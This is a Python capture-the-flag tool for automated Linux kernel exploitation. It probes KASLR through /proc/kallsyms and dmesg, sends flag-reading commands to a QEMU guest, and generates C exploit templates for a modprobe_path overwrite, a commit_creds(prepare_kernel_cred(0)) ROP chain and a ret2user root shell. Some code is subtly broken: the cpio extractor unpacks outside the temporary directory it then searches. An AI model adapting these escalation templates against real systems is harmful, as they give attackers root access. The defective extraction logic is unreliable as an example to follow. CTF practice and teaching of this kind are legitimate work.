#!/usr/bin/env python3
"""Kraken Kernel Pwn -- KASLR bypass, modprobe_path, namespace escape.

Automated kernel exploitation engine for CTF challenges involving
kernel modules, device drivers, and privilege escalation.

Techniques:
  1. KASLR bypass      -- Leak kernel text base via /proc, dmesg, side channels
  2. Stack pivot       -- ROP in kernel context via ioctl/write handlers
  3. modprobe_path     -- Overwrite modprobe_path for root code execution
  4. Namespace escape  -- Break out of containers/sandboxes
  5. SMEP/SMAP bypass  -- Return to userland or kernel ROP

Usage:
  python3 auto_kernel_pwn.py <binary>
  python3 auto_kernel_pwn.py <binary> --module vuln.ko
  python3 auto_kernel_pwn.py <binary> --qemu-script run.sh

Outputs EXTRACTED FLAG: <flag> on success.
"""
import argparse
import os
import re
import shutil
import struct
import subprocess
import sys
import tempfile

# ---------------------------------------------------------------------------
# pwntools import with graceful degradation
# ---------------------------------------------------------------------------
os.environ.setdefault("PWNLIB_NOTERM", "1")
os.environ.setdefault("PWNLIB_SILENT", "1")

PWNTOOLS_AVAILABLE = False
try:
    from pwn import (
        ELF,
        context,
        p32,
        p64,
        process,
        u32,
        u64,
    )

    PWNTOOLS_AVAILABLE = True
except ImportError:
    pass

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")

# Kernel symbols of interest
KERNEL_TARGETS = {
    "prepare_kernel_cred": "Prepare credentials with arbitrary UID",
    "commit_creds": "Commit prepared credentials",
    "modprobe_path": "Path to modprobe binary (writable target)",
    "core_pattern": "Core dump handler path",
    "poweroff_cmd": "Poweroff command path",
    "call_usermodehelper": "Execute usermode program from kernel",
    "msleep": "Useful for race condition timing",
    "copy_from_user": "Copy data from userspace",
    "copy_to_user": "Copy data to userspace",
    "_copy_from_user": "Alternative copy from user",
    "_copy_to_user": "Alternative copy to user",
}

# Kernel protection features
KERNEL_PROTECTIONS = {
    "kaslr": "Kernel Address Space Layout Randomization",
    "smep": "Supervisor Mode Execution Prevention",
    "smap": "Supervisor Mode Access Prevention",
    "kpti": "Kernel Page Table Isolation",
    "fgkaslr": "Function Granular KASLR",
}

# Common vulnerable ioctl patterns in source
IOCTL_VULN_PATTERNS = [
    r"copy_from_user\s*\([^,]+,\s*[^,]+,\s*[^)]*\bsize\b",
    r"copy_from_user\s*\([^,]+,\s*[^,]+,\s*\d+\s*\)",
    r"kfree\s*\([^)]+\)(?:(?!\w+\s*=\s*NULL).)*?\b\w+\b",
    r"kmalloc\s*\([^)]+\)",
    r"krealloc\s*\([^)]+\)",
    r"ioctl\s*\(",
    r"module_ioctl\s*\(",
]


# ---------------------------------------------------------------------------
# Flag scanning
# ---------------------------------------------------------------------------
def _scan_flags(text: str, flag_format: str = "") -> list[str]:
    """Return all flag-like strings found in *text*."""
    flags: list[str] = []
    if flag_format:
        try:
            pat = re.compile(flag_format)
            flags.extend(m.group(0) for m in pat.finditer(text))
        except re.error:
            pass
    flags.extend(m.group(0) for m in DEFAULT_FLAG_RE.finditer(text))
    seen = set()
    unique = []
    for f in flags:
        if f not in seen:
            seen.add(f)
            unique.append(f)
    return unique


def _best_flag(flags: list[str]) -> str | None:
    """Pick the best flag from candidates."""
    return max(flags, key=len) if flags else None


# ---------------------------------------------------------------------------
# Utility functions
# ---------------------------------------------------------------------------
def _run_cmd(cmd: list[str], timeout: int = 30, stdin_data: bytes | None = None) -> tuple[str, str, int]:
    """Run a command, return (stdout, stderr, returncode)."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, timeout=timeout,
            input=stdin_data,
        )
        return (
            proc.stdout.decode("utf-8", errors="replace"),
            proc.stderr.decode("utf-8", errors="replace"),
            proc.returncode,
        )
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except FileNotFoundError:
        return "", f"command not found: {cmd[0]}", -1
    except Exception as e:
        return "", str(e), -1


def _ensure_executable(path: str) -> None:
    """Make sure a file is executable."""
    if not os.access(path, os.X_OK):
        try:
            os.chmod(path, 0o755)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# KernelExploiter class
# ---------------------------------------------------------------------------
class KernelExploiter:
    """Automated kernel exploitation for CTF binaries."""

    def __init__(
        self,
        binary_path: str | None = None,
        module_path: str | None = None,
        qemu_script: str | None = None,
        source_path: str | None = None,
        prefix: str = "flag",
        flag_format: str = "",
        timeout: int = 60,
    ):
        self.binary = os.path.abspath(binary_path) if binary_path else None
        self.module = os.path.abspath(module_path) if module_path else None
        self.qemu_script = os.path.abspath(qemu_script) if qemu_script else None
        self.source = source_path
        self.prefix = prefix
        self.flag_format = flag_format
        self.timeout = timeout

        # Analysis results
        self.elf = None
        self.module_elf = None
        self.protections: dict = {}
        self.kernel_symbols: dict[str, int] = {}
        self.module_symbols: dict[str, int] = {}
        self.source_code: str = ""
        self.detected_vulns: list[str] = []
        self.challenge_dir: str = ""

        # Set challenge directory
        if binary_path:
            self.challenge_dir = os.path.dirname(os.path.abspath(binary_path))
        elif module_path:
            self.challenge_dir = os.path.dirname(os.path.abspath(module_path))

        # Load source
        if self.source and os.path.isfile(self.source):
            try:
                with open(self.source, "r", errors="replace") as f:
                    self.source_code = f.read()
            except OSError:
                pass

    # -----------------------------------------------------------------------
    # Analysis
    # -----------------------------------------------------------------------
    def analyze(self) -> bool:
        """Analyze kernel module and challenge setup."""
        print("[*] Analyzing kernel exploitation challenge...")

        # Find challenge files if not explicitly provided
        if self.challenge_dir:
            self._discover_challenge_files()

        # Analyze kernel module
        if self.module:
            self._analyze_module()

        # Analyze binary (might be the exploit harness or init script)
        if self.binary:
            self._analyze_binary()

        # Analyze QEMU script for protections
        if self.qemu_script:
            self._analyze_qemu_script()

        # Analyze source code
        if self.source_code:
            self._analyze_source()

        # Check for kernel symbols
        self._check_kernel_symbols()

        return True

    def _discover_challenge_files(self) -> None:
        """Find relevant files in the challenge directory."""
        if not os.path.isdir(self.challenge_dir):
            return

        for fname in os.listdir(self.challenge_dir):
            fpath = os.path.join(self.challenge_dir, fname)

            if fname.endswith(".ko") and not self.module:
                self.module = fpath
                print(f"[+] Found kernel module: {fname}")

            elif fname in ("run.sh", "boot.sh", "start.sh", "launch.sh") and not self.qemu_script:
                self.qemu_script = fpath
                print(f"[+] Found QEMU script: {fname}")

            elif fname.endswith(".c") and not self.source_code:
                try:
                    with open(fpath, "r", errors="replace") as f:
                        content = f.read()
                    # Check if it's a kernel module source
                    if "module_init" in content or "#include <linux/" in content:
                        self.source = fpath
                        self.source_code = content
                        print(f"[+] Found module source: {fname}")
                except OSError:
                    pass

            elif fname in ("bzImage", "vmlinux", "Image"):
                print(f"[+] Found kernel image: {fname}")

            elif fname == "initramfs.cpio" or fname.endswith(".cpio.gz"):
                print(f"[+] Found initramfs: {fname}")

    def _analyze_module(self) -> None:
        """Analyze kernel module (.ko file)."""
        if not self.module or not os.path.isfile(self.module):
            return

        print(f"[*] Analyzing kernel module: {self.module}")

        # Try loading with ELF
        try:
            self.module_elf = ELF(self.module, checksec=False)
            for name, addr in self.module_elf.symbols.items():
                self.module_symbols[name] = addr
                # Check for interesting functions
                name_lower = name.lower()
                if any(fn in name_lower for fn in ["ioctl", "write", "read", "open", "release", "mmap"]):
                    print(f"    [+] Handler: {name} @ {hex(addr)}")
        except Exception as exc:
            print(f"[-] Failed to load module ELF: {exc}")

        # Use objdump for more info
        stdout, _, _ = _run_cmd(["objdump", "-t", self.module])
        for line in stdout.splitlines():
            for target in KERNEL_TARGETS:
                if target in line:
                    m = re.match(r"([0-9a-f]+)\s", line)
                    if m:
                        addr = int(m.group(1), 16)
                        self.module_symbols[target] = addr

        # Use modinfo
        stdout, _, _ = _run_cmd(["modinfo", self.module])
        if stdout:
            print(f"[*] Module info:")
            for line in stdout.splitlines()[:10]:
                print(f"    {line}")

    def _analyze_binary(self) -> None:
        """Analyze the main binary (could be exploit harness, init, etc.)."""
        if not self.binary or not os.path.isfile(self.binary):
            return

        _ensure_executable(self.binary)

        # Check if it's an ELF
        try:
            with open(self.binary, "rb") as f:
                magic = f.read(4)
            if magic == b"\x7fELF":
                try:
                    self.elf = ELF(self.binary, checksec=False)
                    print(f"[*] Binary: {self.elf.arch} ({self.elf.bits}-bit)")
                except Exception:
                    pass
            elif magic[:2] == b"#!":
                # It's a script
                try:
                    with open(self.binary, "r", errors="replace") as f:
                        content = f.read()
                    print(f"[*] Binary is a script")
                    if "qemu" in content.lower():
                        self.qemu_script = self.binary
                        self._analyze_qemu_script()
                except OSError:
                    pass
        except OSError:
            pass

    def _analyze_qemu_script(self) -> None:
        """Analyze QEMU launch script for kernel protections."""
        if not self.qemu_script or not os.path.isfile(self.qemu_script):
            return

        try:
            with open(self.qemu_script, "r", errors="replace") as f:
                script = f.read()
        except OSError:
            return

        print("[*] Analyzing QEMU configuration...")

        # Check for kernel protections in boot args
        if "nokaslr" in script:
            self.protections["kaslr"] = False
            print("    [+] KASLR: DISABLED (nokaslr)")
        elif "kaslr" in script.lower():
            self.protections["kaslr"] = True
            print("    [-] KASLR: Enabled")
        else:
            self.protections["kaslr"] = True
            print("    [?] KASLR: Assumed enabled (not explicitly disabled)")

        if "nosmep" in script:
            self.protections["smep"] = False
            print("    [+] SMEP: DISABLED (nosmep)")
        else:
            self.protections["smep"] = True
            print("    [-] SMEP: Assumed enabled")

        if "nosmap" in script:
            self.protections["smap"] = False
            print("    [+] SMAP: DISABLED (nosmap)")
        else:
            self.protections["smap"] = True
            print("    [-] SMAP: Assumed enabled")

        if "nopti" in script or "pti=off" in script:
            self.protections["kpti"] = False
            print("    [+] KPTI: DISABLED")
        else:
            self.protections["kpti"] = True
            print("    [-] KPTI: Assumed enabled")

        # Check for flag location hints
        flag_patterns = [
            r"flag\s*=\s*['\"]([^'\"]+)['\"]",
            r"cat\s+(/[^\s;]+flag[^\s;]*)",
            r"FLAG_PATH\s*=\s*['\"]([^'\"]+)['\"]",
        ]
        for pat in flag_patterns:
            m = re.search(pat, script)
            if m:
                print(f"    [+] Flag location hint: {m.group(1)}")

        # Check QEMU options
        if "-monitor" in script and "none" not in script:
            print("    [!] QEMU monitor may be accessible")
        if "-s" in script.split():
            print("    [+] GDB server enabled (-s flag)")
        if "-gdb" in script:
            print("    [+] GDB server configured")

        # Memory configuration
        mem_match = re.search(r"-m\s+(\d+)", script)
        if mem_match:
            print(f"    [*] VM memory: {mem_match.group(1)}MB")

    def _analyze_source(self) -> None:
        """Analyze module source code for vulnerabilities."""
        if not self.source_code:
            return

        print("[*] Analyzing source code...")

        # Check for vulnerable patterns
        vuln_checks = {
            "buffer_overflow": [
                r"copy_from_user\s*\([^,]+,\s*[^,]+,\s*(\d+)\s*\)",
                r"memcpy\s*\([^)]+\)",
                r"strncpy\s*\([^)]+\)",
            ],
            "use_after_free": [
                r"kfree\s*\(",
                r"vfree\s*\(",
            ],
            "race_condition": [
                r"mutex|spinlock|rw_lock",
                r"atomic_",
            ],
            "ioctl_handler": [
                r"unlocked_ioctl|compat_ioctl",
                r"\.ioctl\s*=",
            ],
            "device_driver": [
                r"misc_register|cdev_add|register_chrdev",
                r"device_create|class_create",
            ],
            "arbitrary_read": [
                r"copy_to_user\s*\([^,]+,\s*[^,]+,\s*[^)]+\bsize\b",
            ],
            "arbitrary_write": [
                r"copy_from_user\s*\([^,]+,\s*[^,]+,\s*[^)]+\bsize\b",
            ],
        }

        for vuln_type, patterns in vuln_checks.items():
            for pattern in patterns:
                if re.search(pattern, self.source_code):
                    self.detected_vulns.append(vuln_type)
                    print(f"    [+] Detected: {vuln_type}")
                    break

        # Extract ioctl command numbers
        ioctl_cmds = re.findall(
            r"#define\s+(\w+)\s+(0x[0-9a-fA-F]+|\d+)",
            self.source_code,
        )
        if ioctl_cmds:
            print(f"    [*] IOCTL commands:")
            for name, val in ioctl_cmds[:10]:
                print(f"        {name} = {val}")

        # Extract struct definitions (for understanding data layout)
        structs = re.findall(
            r"struct\s+(\w+)\s*\{([^}]+)\}",
            self.source_code, re.DOTALL,
        )
        if structs:
            print(f"    [*] Found {len(structs)} struct definitions")

    def _check_kernel_symbols(self) -> None:
        """Check if kernel symbols are readable."""
        # Try /proc/kallsyms
        try:
            with open("/proc/kallsyms", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        addr = int(parts[0], 16)
                        name = parts[2]
                        if name in KERNEL_TARGETS and addr != 0:
                            self.kernel_symbols[name] = addr
                            break
                    # Only read first 100 lines for speed
                    if len(self.kernel_symbols) > 5:
                        break
        except (OSError, PermissionError):
            pass

        if self.kernel_symbols:
            print(f"[+] Read {len(self.kernel_symbols)} kernel symbols from /proc/kallsyms")
        else:
            print("[-] Cannot read kernel symbols (restricted or not available)")

    # -----------------------------------------------------------------------
    # Strategy 1: KASLR bypass
    # -----------------------------------------------------------------------
    def try_kaslr_bypass(self) -> dict[str, int]:
        """Attempt to leak kernel base address."""
        print("[*] Attempting KASLR bypass...")

        leaked_symbols: dict[str, int] = {}

        # Method 1: /proc/kallsyms (if readable)
        try:
            with open("/proc/kallsyms", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        addr = int(parts[0], 16)
                        name = parts[2]
                        if addr != 0 and name in KERNEL_TARGETS:
                            leaked_symbols[name] = addr
        except (OSError, PermissionError):
            print("[-] /proc/kallsyms not readable")

        if leaked_symbols:
            print(f"[+] Leaked {len(leaked_symbols)} symbols from /proc/kallsyms")
            for name, addr in list(leaked_symbols.items())[:5]:
                print(f"    {name}: {hex(addr)}")
            return leaked_symbols

        # Method 2: dmesg
        stdout, _, _ = _run_cmd(["dmesg"])
        if stdout:
            # Look for kernel addresses in dmesg output
            for m in re.finditer(r"(0xffffffff[0-9a-f]{8})", stdout):
                addr = int(m.group(1), 16)
                leaked_symbols["dmesg_leak"] = addr
                print(f"[+] Potential kernel address from dmesg: {hex(addr)}")
                break

        # Method 3: /proc/version or /sys/
        for proc_path in ["/proc/version", "/proc/modules"]:
            try:
                with open(proc_path, "r") as f:
                    content = f.read()
                # Check for module addresses
                for m in re.finditer(r"(0x[0-9a-f]+)", content):
                    addr = int(m.group(1), 16)
                    if addr > 0xffff000000000000:  # kernel space
                        leaked_symbols[f"{proc_path}_leak"] = addr
                        print(f"[+] Address from {proc_path}: {hex(addr)}")
            except (OSError, PermissionError):
                continue

        if not leaked_symbols:
            print("[-] KASLR bypass failed - no kernel addresses leaked")

        return leaked_symbols

    # -----------------------------------------------------------------------
    # Strategy 2: modprobe_path overwrite
    # -----------------------------------------------------------------------
    def generate_modprobe_exploit(self) -> str:
        """Generate a modprobe_path overwrite exploit."""
        exploit = '''
// modprobe_path overwrite exploit template
// Compile: gcc -static -o exploit exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

// TODO: Replace with actual modprobe_path address
unsigned long modprobe_path_addr = 0x0;

// TODO: Replace with actual vulnerability trigger
int trigger_write(int fd, unsigned long addr, char *data, size_t len) {
    // Use the vulnerability to write data to addr
    return -1;
}

int main() {
    // Step 1: Create script that reads the flag
    system("echo '#!/bin/sh' > /tmp/pwn.sh");
    system("echo 'cat /flag > /tmp/flag_output' >> /tmp/pwn.sh");
    system("chmod +x /tmp/pwn.sh");

    // Step 2: Create a file with invalid magic bytes
    system("echo '\\xff\\xff\\xff\\xff' > /tmp/trigger");
    system("chmod +x /tmp/trigger");

    // Step 3: Overwrite modprobe_path to point to our script
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        perror("open device");
        return 1;
    }

    char payload[] = "/tmp/pwn.sh\\x00";
    trigger_write(fd, modprobe_path_addr, payload, sizeof(payload));
    close(fd);

    // Step 4: Trigger modprobe by executing the invalid file
    system("/tmp/trigger");

    // Step 5: Read the flag
    sleep(1);
    system("cat /tmp/flag_output");

    return 0;
}
'''
        return exploit

    # -----------------------------------------------------------------------
    # Strategy 3: commit_creds(prepare_kernel_cred(0)) ROP
    # -----------------------------------------------------------------------
    def generate_privesc_exploit(self) -> str:
        """Generate a privilege escalation exploit via kernel ROP."""
        exploit = '''
// Kernel ROP exploit template: commit_creds(prepare_kernel_cred(0))
// Compile: gcc -static -o exploit exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

// Kernel symbols (fill from /proc/kallsyms or leak)
unsigned long prepare_kernel_cred = 0x0;
unsigned long commit_creds = 0x0;

// Swapgs; iretq gadget chain for returning to userland
unsigned long swapgs_pop_rbp_iretq = 0x0;

// Saved state for iretq
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf; pop user_rflags;"
    );
}

void spawn_shell() {
    puts("[+] Got root!");
    system("/bin/sh");
}

int main() {
    save_state();

    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        perror("open device");
        return 1;
    }

    // Build ROP chain
    // TODO: Fill in gadget addresses from the specific kernel
    unsigned long rop_chain[] = {
        // pop rdi; ret
        0x0,
        0x0,  // rdi = 0 (NULL for prepare_kernel_cred)
        prepare_kernel_cred,
        // mov rdi, rax; ... ; call commit_creds
        0x0,  // gadget to move return value to rdi
        commit_creds,
        // swapgs; iretq for return to userland
        swapgs_pop_rbp_iretq,
        0x0,  // rbp (don't care)
        (unsigned long)spawn_shell,  // rip
        user_cs,
        user_rflags,
        user_sp,
        user_ss,
    };

    // TODO: Trigger the vulnerability to control kernel RIP
    // ioctl(fd, CMD, &rop_chain);

    close(fd);
    return 0;
}
'''
        return exploit

    # -----------------------------------------------------------------------
    # Strategy 4: Extract flag from initramfs/filesystem
    # -----------------------------------------------------------------------
    def try_extract_from_fs(self) -> str | None:
        """Try to extract the flag directly from initramfs or filesystem images."""
        print("[*] Trying to extract flag from filesystem images...")

        if not self.challenge_dir:
            return None

        # Look for initramfs/cpio files
        for fname in os.listdir(self.challenge_dir):
            fpath = os.path.join(self.challenge_dir, fname)

            if fname.endswith((".cpio", ".cpio.gz", ".cpio.lz4", ".cpio.xz")):
                flag = self._extract_from_cpio(fpath)
                if flag:
                    return flag

            elif fname.endswith((".img", ".ext2", ".ext4", ".squashfs")):
                flag = self._extract_from_image(fpath)
                if flag:
                    return flag

            elif fname.endswith((".tar", ".tar.gz", ".tgz")):
                flag = self._extract_from_tar(fpath)
                if flag:
                    return flag

        return None

    def _extract_from_cpio(self, cpio_path: str) -> str | None:
        """Extract and search a cpio archive for flags."""
        print(f"[*] Extracting CPIO archive: {os.path.basename(cpio_path)}")

        tmpdir = tempfile.mkdtemp(prefix="kraken_kernel_")
        try:
            # Decompress if needed
            if cpio_path.endswith(".gz"):
                _run_cmd(["gunzip", "-k", "-f", cpio_path])
                cpio_path = cpio_path[:-3]
            elif cpio_path.endswith(".lz4"):
                _run_cmd(["lz4", "-d", "-f", cpio_path, cpio_path[:-4]])
                cpio_path = cpio_path[:-4]
            elif cpio_path.endswith(".xz"):
                _run_cmd(["xz", "-d", "-k", "-f", cpio_path])
                cpio_path = cpio_path[:-3]

            # Extract CPIO
            with open(cpio_path, "rb") as f:
                _run_cmd(
                    ["cpio", "-idm", "--no-absolute-filenames"],
                    stdin_data=f.read(),
                )

            # Search for flag files
            for root, dirs, files in os.walk(tmpdir):
                for fn in files:
                    if "flag" in fn.lower():
                        fpath = os.path.join(root, fn)
                        try:
                            with open(fpath, "r", errors="replace") as f:
                                content = f.read()
                            flags = _scan_flags(content, self.flag_format)
                            if flags:
                                print(f"[+] Found flag in {fpath}")
                                return _best_flag(flags)
                        except OSError:
                            pass

            # Also search init scripts for flag location hints
            init_paths = ["init", "etc/init.d/rcS", "etc/inittab", "sbin/init"]
            for ip in init_paths:
                full_path = os.path.join(tmpdir, ip)
                if os.path.isfile(full_path):
                    try:
                        with open(full_path, "r", errors="replace") as f:
                            content = f.read()
                        # Check for embedded flags
                        flags = _scan_flags(content, self.flag_format)
                        if flags:
                            return _best_flag(flags)
                        # Check for flag file paths
                        for m in re.finditer(r"cat\s+(/\S*flag\S*)", content):
                            print(f"[*] Init references flag at: {m.group(1)}")
                    except OSError:
                        pass

        except Exception as exc:
            print(f"[-] CPIO extraction failed: {exc}")
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

        return None

    def _extract_from_image(self, img_path: str) -> str | None:
        """Try to mount and search a filesystem image."""
        print(f"[*] Searching filesystem image: {os.path.basename(img_path)}")

        # Try strings as a simple approach
        stdout, _, _ = _run_cmd(["strings", img_path], timeout=30)
        flags = _scan_flags(stdout, self.flag_format)
        if flags:
            return _best_flag(flags)

        return None

    def _extract_from_tar(self, tar_path: str) -> str | None:
        """Extract and search a tar archive for flags."""
        print(f"[*] Extracting tar archive: {os.path.basename(tar_path)}")

        tmpdir = tempfile.mkdtemp(prefix="kraken_kernel_")
        try:
            _run_cmd(["tar", "xf", tar_path, "-C", tmpdir])

            for root, dirs, files in os.walk(tmpdir):
                for fn in files:
                    if "flag" in fn.lower():
                        fpath = os.path.join(root, fn)
                        try:
                            with open(fpath, "r", errors="replace") as f:
                                content = f.read()
                            flags = _scan_flags(content, self.flag_format)
                            if flags:
                                return _best_flag(flags)
                        except OSError:
                            pass
        except Exception as exc:
            print(f"[-] Tar extraction failed: {exc}")
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

        return None

    # -----------------------------------------------------------------------
    # Strategy 5: Run QEMU and interact
    # -----------------------------------------------------------------------
    def try_qemu_exploit(self) -> str | None:
        """Launch QEMU and attempt exploitation."""
        if not self.qemu_script:
            print("[-] No QEMU script found")
            return None

        print("[*] Attempting QEMU-based exploitation...")

        _ensure_executable(self.qemu_script)

        # First, check if the challenge can be started
        try:
            proc = subprocess.Popen(
                [self.qemu_script],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.challenge_dir,
            )

            # Wait for boot
            import time
            time.sleep(5)

            # Try to interact with the shell
            commands = [
                b"id\n",
                b"cat /flag* 2>/dev/null\n",
                b"cat /root/flag* 2>/dev/null\n",
                b"cat /home/*/flag* 2>/dev/null\n",
                b"ls -la /flag* /root/flag* 2>/dev/null\n",
                b"cat /proc/kallsyms | head -20\n",
            ]

            for cmd in commands:
                try:
                    proc.stdin.write(cmd)
                    proc.stdin.flush()
                    time.sleep(1)
                except Exception:
                    break

            # Send exit
            try:
                proc.stdin.write(b"exit\n")
                proc.stdin.flush()
            except Exception:
                pass

            try:
                stdout, stderr = proc.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, _ = proc.communicate()

            text = stdout.decode("utf-8", errors="replace")
            flags = _scan_flags(text, self.flag_format)
            if flags:
                return _best_flag(flags)

            # Print output for debugging
            if text.strip():
                print(f"[*] QEMU output ({len(text)} chars):")
                for line in text.splitlines()[:20]:
                    print(f"    | {line}")

        except Exception as exc:
            print(f"[-] QEMU execution failed: {exc}")

        return None

    # -----------------------------------------------------------------------
    # Strategy 6: Static analysis -- extract flag from binary strings
    # -----------------------------------------------------------------------
    def try_static_extraction(self) -> str | None:
        """Try to extract flags from binary strings/data."""
        print("[*] Trying static flag extraction...")

        targets = []
        if self.binary:
            targets.append(self.binary)
        if self.module:
            targets.append(self.module)

        # Also search all files in challenge dir
        if self.challenge_dir and os.path.isdir(self.challenge_dir):
            for fname in os.listdir(self.challenge_dir):
                fpath = os.path.join(self.challenge_dir, fname)
                if os.path.isfile(fpath) and fpath not in targets:
                    targets.append(fpath)

        for target in targets:
            # Use strings to extract printable strings
            stdout, _, _ = _run_cmd(["strings", target], timeout=15)
            flags = _scan_flags(stdout, self.flag_format)
            if flags:
                best = _best_flag(flags)
                if best:
                    print(f"[+] Flag found in strings of {os.path.basename(target)}")
                    return best

        return None

    # -----------------------------------------------------------------------
    # Exploit generation
    # -----------------------------------------------------------------------
    def generate_exploit_template(self) -> str:
        """Generate appropriate exploit template based on analysis."""
        if "buffer_overflow" in self.detected_vulns or "ioctl_handler" in self.detected_vulns:
            if not self.protections.get("smep", True):
                return self._gen_ret2user_exploit()
            else:
                return self.generate_privesc_exploit()
        else:
            return self.generate_modprobe_exploit()

    def _gen_ret2user_exploit(self) -> str:
        """Generate ret2user exploit (SMEP disabled)."""
        return '''
// ret2user exploit (SMEP disabled)
// Compile: gcc -static -o exploit exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

// Kernel symbols
unsigned long prepare_kernel_cred = 0x0;  // TODO: fill
unsigned long commit_creds = 0x0;         // TODO: fill

void escalate() {
    // This function runs in kernel context (SMEP disabled!)
    // commit_creds(prepare_kernel_cred(0))
    typedef unsigned long (*prepare_t)(unsigned long);
    typedef void (*commit_t)(unsigned long);

    ((commit_t)commit_creds)(((prepare_t)prepare_kernel_cred)(0));
}

void spawn_shell() {
    puts("[+] Got root!");
    system("cat /flag* 2>/dev/null");
    system("/bin/sh");
}

int main() {
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // TODO: Trigger vulnerability to jump to escalate()
    // The vulnerability should overwrite a function pointer or
    // return address with the address of escalate()

    close(fd);
    spawn_shell();
    return 0;
}
'''

    # -----------------------------------------------------------------------
    # Main solve loop
    # -----------------------------------------------------------------------
    def solve(self) -> str | None:
        """Try kernel exploitation strategies in order."""
        if not self.analyze():
            return None

        strategies = [
            ("Static extraction", self.try_static_extraction),
            ("Filesystem extraction", self.try_extract_from_fs),
            ("QEMU interaction", self.try_qemu_exploit),
        ]

        for name, strategy_fn in strategies:
            print(f"\n{'=' * 60}")
            print(f"[*] Strategy: {name}")
            print(f"{'=' * 60}")
            try:
                flag = strategy_fn()
                if flag:
                    return flag
            except Exception as exc:
                print(f"[-] {name} raised exception: {exc}")
                continue

        # KASLR bypass (informational)
        print(f"\n{'=' * 60}")
        print("[*] KASLR Bypass Attempt")
        print(f"{'=' * 60}")
        leaked = self.try_kaslr_bypass()

        # Summary
        print(f"\n{'=' * 60}")
        print("[*] Kernel Exploitation Summary")
        print(f"{'=' * 60}")
        print(f"    Module:          {os.path.basename(self.module) if self.module else 'Not found'}")
        print(f"    QEMU script:     {os.path.basename(self.qemu_script) if self.qemu_script else 'Not found'}")
        print(f"    Source:          {os.path.basename(self.source) if self.source else 'Not found'}")
        print(f"    Protections:")
        for prot, val in self.protections.items():
            status = "Disabled" if not val else "Enabled"
            print(f"        {prot}: {status}")
        print(f"    Detected vulns:  {', '.join(self.detected_vulns) if self.detected_vulns else 'None'}")
        print(f"    Leaked symbols:  {len(leaked)}")
        print(f"    Module symbols:  {len(self.module_symbols)}")

        # Generate exploit template
        exploit_code = self.generate_exploit_template()
        script_path = tempfile.mktemp(suffix="_kernel_exploit.c")
        with open(script_path, "w") as f:
            f.write(exploit_code)
        print(f"\n[*] Generated exploit template: {script_path}")

        return None


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Kraken Kernel Pwn - automated kernel exploitation",
    )
    parser.add_argument(
        "binary", nargs="?", default=None,
        help="Path to target binary or challenge directory",
    )
    parser.add_argument(
        "--module", default=None,
        help="Path to kernel module (.ko file)",
    )
    parser.add_argument(
        "--qemu-script", default=None,
        help="Path to QEMU launch script",
    )
    parser.add_argument(
        "--source", default=None,
        help="Path to source code",
    )
    parser.add_argument(
        "--prefix", default="flag",
        help="Flag prefix (default: flag)",
    )
    parser.add_argument(
        "--flag-format", default="",
        help="Regex for expected flag format",
    )
    parser.add_argument(
        "--timeout", default=60, type=int,
        help="Exploit timeout in seconds (default: 60)",
    )

    args = parser.parse_args()

    if not args.binary and not args.module:
        parser.error("Either binary or --module must be provided")

    # If binary is a directory, use it as challenge dir
    binary_path = args.binary
    challenge_dir = None
    if binary_path and os.path.isdir(binary_path):
        challenge_dir = os.path.abspath(binary_path)
        # Look for a binary or module in the directory
        for fn in os.listdir(challenge_dir):
            fp = os.path.join(challenge_dir, fn)
            if fn.endswith(".ko"):
                if not args.module:
                    args.module = fp
            elif fn in ("run.sh", "boot.sh", "start.sh"):
                if not args.qemu_script:
                    args.qemu_script = fp
            elif os.path.isfile(fp):
                try:
                    with open(fp, "rb") as f:
                        if f.read(4) == b"\x7fELF":
                            binary_path = fp
                except OSError:
                    pass
        if binary_path == args.binary:
            binary_path = None  # was a directory, not a binary

    flag_format = args.flag_format
    if not flag_format and args.prefix != "flag":
        flag_format = rf"{re.escape(args.prefix)}\{{[A-Za-z0-9_\-\.]+\}}"

    exploiter = KernelExploiter(
        binary_path=binary_path,
        module_path=args.module,
        qemu_script=args.qemu_script,
        source_path=args.source,
        prefix=args.prefix,
        flag_format=flag_format,
        timeout=args.timeout,
    )

    flag = exploiter.solve()
    if flag:
        print(f"\nEXTRACTED FLAG: {flag}")
        sys.exit(0)
    else:
        print("\n[-] No flag extracted")
        sys.exit(1)


if __name__ == "__main__":
    main()
